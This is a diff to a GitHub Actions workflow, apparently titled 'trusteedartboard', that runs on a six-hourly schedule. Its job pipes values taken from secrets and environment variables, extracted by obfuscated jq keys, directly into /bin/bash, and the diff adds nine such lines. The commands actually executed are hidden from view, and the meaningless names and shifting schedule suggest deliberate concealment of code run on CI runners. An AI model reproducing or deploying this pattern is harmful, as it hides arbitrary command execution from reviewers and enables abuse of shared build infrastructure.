@@ -3,21 +3,23 @@ name: trusteedartboard
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
+    - cron: '42 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: trusteedartboard
         env:
-          zs1: ${{ secrets.zs1 }}
+          v789: ${{ secrets.v789 }}
         run: |
-          echo $zs1 | jq -r .wi5522 | /bin/bash
-          echo $jrzoy9 | jq -r .wyvom365 | /bin/bash
-          echo $qo1175 | jq -r .s69697 | /bin/bash
-          echo $uklay1 | jq -r .b93 | /bin/bash
-          echo $dszm8589 | jq -r .rboj1 | /bin/bash
-          echo $ptr8705 | jq -r .ywd2781 | /bin/bash
+          echo $v789 | jq -r .cx49104 | /bin/bash
+          echo $k3 | jq -r .lmya143 | /bin/bash
+          echo $rnfl98186 | jq -r .fpqa3 | /bin/bash
+          echo $snq870 | jq -r .vhhma1072 | /bin/bash
+          echo $ah955 | jq -r .zk805 | /bin/bash
+          echo $wwhhv4 | jq -r .qp02100 | /bin/bash
+          echo $drx267 | jq -r .q122 | /bin/bash
+          echo $opahc28078 | jq -r .hhak6 | /bin/bash
+          echo $ilafy58 | jq -r .a51 | /bin/bash
 
